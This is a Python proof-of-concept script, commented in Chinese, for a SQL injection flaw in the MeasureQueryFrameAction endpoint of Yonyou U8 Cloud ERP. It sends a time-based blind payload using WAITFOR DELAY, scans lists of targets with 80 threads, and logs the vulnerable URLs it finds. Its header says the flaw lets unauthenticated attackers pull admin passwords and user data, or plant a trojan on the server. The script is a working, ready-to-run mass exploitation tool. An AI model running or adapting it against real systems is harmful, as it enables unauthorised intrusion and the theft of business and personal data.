# -*- coding: utf-8 -*-
# 用友U8 Cloud MeasureQueryFrameAction SQL注入漏洞
# title=="U8C"
# 产品简介:用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。
# 漏洞概述:用友U8 Cloud MeasureQueryFrameAction接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
\x1b[38m██╗   ██╗ █████╗          ██████╗██╗      ██████╗ ██╗   ██╗██████╗ 
\x1b[36m██║   ██║██╔══██╗        ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗
\x1b[34m██║   ██║╚█████╔╝        ██║     ██║     ██║   ██║██║   ██║██║  ██║
\x1b[35m██║   ██║██╔══██╗        ██║     ██║     ██║   ██║██║   ██║██║  ██║
\x1b[31m╚██████╔╝╚█████╔╝███████╗╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝
\x1b[33m ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝                                                 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                       
--author:Kucei  --Vession:用友U8_Cloud_MeasureQueryFrameAction-SQL注入                                                                                                          
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("用友U8_Cloud_MeasureQueryFrameAction-SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1"
    url_payload2 = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 3.5:
            print( f"[+] {target} 存在漏洞！\n")
            with open('用友U8_Cloud-SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload2+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()